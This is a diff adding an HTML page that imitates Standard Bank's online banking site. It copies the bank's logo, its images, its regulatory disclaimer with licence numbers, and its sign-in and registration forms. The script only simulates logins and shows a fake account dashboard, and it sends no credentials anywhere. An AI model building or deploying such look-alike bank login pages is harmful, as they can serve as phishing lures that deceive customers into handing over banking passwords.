@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Standard Bank Online Banking</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="icon" href="https://cdn.freebiesupply.com/logos/large/2x/standard-bank-logo-png-transparent.png" type="image/png">
+  <style>
+    :root {
+      --sb-blue: #0047ab;
+      --sb-accent: #00a3ff;
+      --sb-success: #1bb55c;
+      --sb-dark: #0a1b2b;
+      --sb-light: #ffffff;
+      --sb-muted: #667085;
+      --radius: 8px;
+    }
+
+    /* Base layout */
+    * { box-sizing: border-box; }
+    body {
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      margin: 0;
+      background: linear-gradient(135deg, #0047ab 0%, #00a3ff 100%);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      color: var(--sb-dark);
+    }
+
+    header {
+      background: rgba(255,255,255,0.95);
+      backdrop-filter: blur(6px);
+      border-bottom: 1px solid #e5e7eb;
+      padding: 12px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+    header img { height: 50px; }
+    nav a {
+      margin-left: 12px;
+      text-decoration: none;
+      font-weight: 600;
+      color: var(--sb-blue);
+      cursor: pointer;
+      transition: color 0.2s ease;
+    }
+    nav a:hover { color: var(--sb-accent); }
+    nav a.hidden { display: none; }
+
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 20px;
+    }
+
+    /* Cards */
+    .card {
+      background: var(--sb-light);
+      border-radius: var(--radius);
+      box-shadow: 0 8px 24px rgba(13, 30, 56, 0.10);
+      padding: 24px;
+      max-width: 720px;
+      width: 100%;
+      margin-top: 28px;
+      animation: fadeIn 0.35s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(16px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    h1, h2 {
+      color: var(--sb-blue);
+      margin: 0 0 10px;
+      font-size: 1.5rem;
+      font-weight: 700;
+    }
+    p.subtitle {
+      color: var(--sb-muted);
+      margin: 8px 0 0;
+      font-size: 0.9rem;
+    }
+
+    /* Buttons */
+    .btn {
+      display: inline-flex;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      padding: 12px;
+      border-radius: var(--radius);
+      font-weight: 600;
+      border: 1px solid transparent;
+      cursor: pointer;
+      margin-top: 12px;
+      transition: transform 0.1s ease, background-color 0.2s ease, color 0.2s ease, box-shadow 0.2s ease;
+      position: relative;
+    }
+    .btn:hover {
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+    }
+    .btn:active { transform: scale(0.98); }
+    .btn-primary {
+      background: var(--sb-blue);
+      color: #fff;
+    }
+    .btn-primary:hover { background: #003087; }
+    .btn-outline {
+      background: #fff;
+      color: var(--sb-blue);
+      border: 1px solid var(--sb-blue);
+    }
+    .btn-outline:hover {
+      background: #f5f7fa;
+    }
+    .btn-success {
+      background: var(--sb-success);
+      color: #fff;
+    }
+    .btn-success:hover { background: #169d4a; }
+    .btn-loading {
+      opacity: 0.8;
+      cursor: not-allowed;
+    }
+    .btn-loading::after {
+      content: "";
+      width: 16px;
+      height: 16px;
+      border: 2px solid #fff;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+      position: absolute;
+      right: 12px;
+    }
+    .btn-loading.btn-outline::after {
+      border-color: var(--sb-blue);
+      border-top-color: transparent;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* Forms */
+    form label {
+      display: block;
+      margin-top: 12px;
+      font-weight: 600;
+      color: var(--sb-dark);
+    }
+    form input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 6px;
+      border: 1px solid #d6dce5;
+      border-radius: 6px;
+      font-size: 1rem;
+      transition: border-color 0.2s ease;
+    }
+    form input:focus {
+      outline: none;
+      border-color: var(--sb-blue);
+      box-shadow: 0 0 0 3px rgba(0, 71, 171, 0.1);
+    }
+    form input:invalid:focus {
+      border-color: #dc3545;
+    }
+
+    /* Images */
+    .hero-img {
+      width: 100%;
+      height: auto;
+      border-radius: var(--radius);
+      margin-top: 16px;
+    }
+
+    /* Invitation banner */
+    .invite-banner {
+      background: #f9fafb;
+      border: 1px solid #e6eaf0;
+      border-radius: var(--radius);
+      padding: 16px;
+      margin-top: 18px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .invite-banner .text {
+      font-weight: 600;
+      color: var(--sb-dark);
+      font-size: 0.95rem;
+    }
+
+    /* Disclaimer */
+    .disclaimer {
+      font-size: 0.85rem;
+      color: var(--sb-muted);
+      margin-top: 16px;
+      text-align: center;
+      opacity: 0;
+      animation: fadeInDisclaimer 0.8s ease forwards;
+      animation-delay: 0.3s;
+    }
+    @keyframes fadeInDisclaimer { to { opacity: 1; } }
+
+    /* Dashboard lists */
+    .accounts { text-align: left; margin-top: 16px; }
+    .accounts h3 {
+      margin-bottom: 8px;
+      color: var(--sb-dark);
+      font-size: 1.1rem;
+    }
+    .accounts ul { list-style: none; padding: 0; margin: 0; }
+    .accounts li {
+      background: #f5f7fa;
+      margin-bottom: 8px;
+      padding: 12px;
+      border-radius: 6px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.95rem;
+    }
+
+    /* Cookie bar */
+    .cookie-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: #f3f4f6;
+      border-top: 1px solid #e5e7eb;
+      padding: 12px 16px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.92rem;
+      z-index: 200;
+      transition: opacity 0.3s ease;
+    }
+    .cookie-bar .btn { width: auto; }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      header { flex-direction: column; align-items: flex-start; }
+      nav { margin-top: 8px; }
+      .card { margin: 14px; padding: 18px; }
+      .invite-banner { flex-direction: column; align-items: flex-start; }
+      .cookie-bar { flex-direction: column; text-align: center; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <img src="https://cdn.freebiesupply.com/logos/large/2x/standard-bank-logo-png-transparent.png" alt="Standard Bank Logo">
+    <nav>
+      <a onclick="showPage('welcome')">Home</a>
+      <a onclick="showPage('login')">Sign In</a>
+      <a onclick="showPage('register')">Register</a>
+      <a id="dashboard-link" class="hidden" onclick="showPage('dashboard')">My Accounts</a>
+    </nav>
+  </header>
+
+  <!-- Main -->
+  <main>
+    <!-- Welcome -->
+    <section id="welcome" class="card">
+      <h1>Standard Bank Online Banking</h1>
+      <p class="subtitle">Access your accounts securely, anytime, anywhere.</p>
+      <div style="display:flex; gap:12px; flex-wrap:wrap;">
+        <button class="btn btn-primary" onclick="handleButtonClick(this, 'login', 'Signing In...')">Sign In</button>
+        <button class="btn btn-outline" onclick="handleButtonClick(this, 'register', 'Registering...')">Register</button>
+      </div>
+      <p class="subtitle">By signing in, I agree to Standard Bank’s <a href="https://www.standardbank.co.za" target="_blank" style="color: var(--sb-blue);">Terms and Conditions</a> (Last updated: June 2025)</p>
+      <img class="hero-img" src="https://frontend-cdn.onlinebanking-ocp-1.standardbank.co.za/illustrations/login-landing-tablet.jpg" alt="Online banking illustration">
+
+      <div class="invite-banner">
+        <div class="text">New to Standard Bank Online Banking?</div>
+        <button class="btn btn-success" onclick="handleButtonClick(this, 'register', 'Starting...')">Get Started</button>
+      </div>
+
+      <!-- Disclaimer -->
+      <p class="disclaimer">
+        Standard Bank of South Africa Limited is an authorised financial services provider under the Financial Advisory and Intermediary Services Act, 2002 (FSP No. 11287) and a registered credit provider under the National Credit Act, 2005 (NCRCP15).
+      </p>
+    </section>
+
+    <!-- Login -->
+    <section id="login" class="card" style="display:none;">
+      <h2>Sign In to Your Account</h2>
+      <form onsubmit="event.preventDefault(); handleFormSubmit(this, 'dashboard', 'Signing In...', true)">
+        <label>Username or Email
+          <input type="email" required placeholder="Enter your email or username">
+        </label>
+        <label>Password
+          <input type="password" required placeholder="Enter your password">
+        </label>
+        <button type="submit" class="btn btn-primary">Sign In</button>
+        <button type="button" class="btn btn-outline" onclick="showPage('welcome')">Back</button>
+      </form>
+      <div style="margin-top:12px; text-align:center; font-size:0.9rem;">
+        <a onclick="showPage('register')" style="color:var(--sb-blue); cursor:pointer; text-decoration:underline;">Create an account</a>
+        &nbsp;•&nbsp;
+        <a href="https://www.standardbank.co.za" target="_blank" style="color:var(--sb-blue); text-decoration:underline;">Forgot Password?</a>
+      </div>
+    </section>
+
+    <!-- Register -->
+    <section id="register" class="card" style="display:none;">
+      <h2>Create Your Online Banking Profile</h2>
+      <form onsubmit="event.preventDefault(); handleFormSubmit(this, 'dashboard', 'Processing Registration...', false)">
+        <label>Full Name
+          <input type="text" required placeholder="Enter your full name">
+        </label>
+        <label>Email Address
+          <input type="email" required placeholder="Enter your email address">
+        </label>
+        <label>Username
+          <input type="text" required placeholder="Choose a username">
+        </label>
+        <label>Password
+          <input type="password" required placeholder="Create a password">
+        </label>
+        <label>Confirm Password
+          <input type="password" required placeholder="Confirm your password">
+        </label>
+        <button type="submit" class="btn btn-success">Register</button>
+        <button type="button" class="btn btn-outline" onclick="showPage('welcome')">Back</button>
+      </form>
+    </section>
+
+    <!-- Dashboard -->
+    <section id="dashboard" class="card" style="display:none;">
+      <h2>My Accounts</h2>
+      <p class="subtitle">Welcome to your Standard Bank dashboard.</p>
+      <div class="accounts">
+        <h3>Your Accounts</h3>
+        <ul>
+          <li><span>Checking Account</span> <strong>R12,450.00</strong></li>
+          <li><span>Savings Account</span> <strong>R8,200.00</strong></li>
+          <li><span>Credit Card</span> <strong>R2,500.00</strong></li>
+        </ul>
+      </div>
+      <div style="margin-top:14px;">
+        <button class="btn btn-outline" onclick="handleLogout()">Sign Out</button>
+      </div>
+    </section>
+  </main>
+
+  <!-- Cookie consent bar -->
+  <div class="cookie-bar" id="cookieBar">
+    <div>Standard Bank uses cookies to enhance your browsing experience and deliver personalised services. By continuing, you consent to our use of cookies as outlined in our <a href="https://www.standardbank.co.za" target="_blank" style="color: var(--sb-blue); text-decoration:underline;">Cookie Policy</a>.</div>
+    <div>
+      <button class="btn btn-outline" onclick="dismissCookies()">Manage Preferences</button>
+      <button class="btn btn-primary" onclick="dismissCookies()">Accept Cookies</button>
+    </div>
+  </div>
+
+  <!-- Scripts -->
+  <script>
+    let isAuthenticated = false;
+
+    function showPage(pageId) {
+      document.querySelectorAll('main section').forEach(sec => sec.style.display = 'none');
+      const el = document.getElementById(pageId);
+      if (el) el.style.display = 'block';
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function handleButtonClick(button, pageId, message) {
+      button.classList.add('btn-loading');
+      button.disabled = true;
+      const original = button.textContent;
+      button.textContent = message;
+      setTimeout(() => {
+        button.classList.remove('btn-loading');
+        button.disabled = false;
+        button.textContent = original;
+        showPage(pageId);
+      }, 800);
+    }
+
+    function handleFormSubmit(form, targetPage, message, isLogin) {
+      const submitBtn = form.querySelector('button[type="submit"]');
+      const original = submitBtn.textContent;
+      submitBtn.classList.add('btn-loading');
+      submitBtn.disabled = true;
+      submitBtn.textContent = message;
+
+      // Basic password confirmation check for registration
+      if (!isLogin) {
+        const password = form.querySelector('input[type="password"]:nth-of-type(1)').value;
+        const confirmPassword = form.querySelector('input[type="password"]:nth-of-type(2)').value;
+        if (password !== confirmPassword) {
+          alert('Error: Passwords do not match.');
+          submitBtn.classList.remove('btn-loading');
+          submitBtn.disabled = false;
+          submitBtn.textContent = original;
+          return;
+        }
+      }
+
+      const delay = isLogin ? 1000 : 1800; // Longer delay for registration
+      setTimeout(() => {
+        submitBtn.classList.remove('btn-loading');
+        submitBtn.disabled = false;
+        submitBtn.textContent = original;
+
+        if (isLogin) {
+          alert('Successfully signed in to Standard Bank Online Banking.');
+        } else {
+          alert('Registration successful! Your Standard Bank online profile has been created and approved.');
+        }
+
+        isAuthenticated = true;
+        document.getElementById('dashboard-link').classList.remove('hidden');
+        showPage(targetPage);
+      }, delay);
+    }
+
+    function handleLogout() {
+      isAuthenticated = false;
+      document.getElementById('dashboard-link').classList.add('hidden');
+      alert('You have been signed out of Standard Bank Online Banking.');
+      showPage('welcome');
+    }
+
+    function dismissCookies() {
+      const bar = document.getElementById('cookieBar');
+      bar.style.transition = 'opacity 0.3s ease';
+      bar.style.opacity = 0;
+      setTimeout(() => { bar.style.display = 'none'; }, 300);
+    }
+  </script>
+</body>
+</html>
